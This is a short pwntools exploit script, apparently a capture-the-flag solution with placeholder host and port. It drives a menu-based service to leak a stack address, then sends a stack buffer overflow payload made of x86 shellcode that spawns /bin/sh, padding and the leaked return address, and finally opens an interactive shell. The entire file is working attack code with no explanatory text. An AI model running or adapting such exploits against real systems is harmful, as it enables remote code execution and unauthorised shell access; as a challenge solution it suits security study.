from pwn import *

r = remote({ip}, {port})
shellcode = b"\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xb0\x08\x40\x40\x40\xcd\x80"

def recv_print():
    data = r.recv(timeout=1).decode('utf-8', errors='ignore')
    print(data)
    return data

def send_cmd(cmd):
    recv_print()
    r.sendline(cmd)
    print(cmd)

send_cmd(b'1')
send_cmd(b'N' * 40 + b'Y' * 37)

send_cmd(b'2')
send_cmd(b'3')

leak_data = r.recvuntil(b'\n')[:-1]
leak_str = leak_data.decode('utf-8')
print(leak_str)
addr = leak_str.split(' ')[-1]
leak = int(addr, 16)

for i in range(6):
    send_cmd(b'4')
    recv_print()

send_cmd(b'1')
payload = shellcode + b'a' * (80 - len(shellcode)) + b'a' * 12 + p32(leak)
send_cmd(payload)
recv_print()

r.interactive()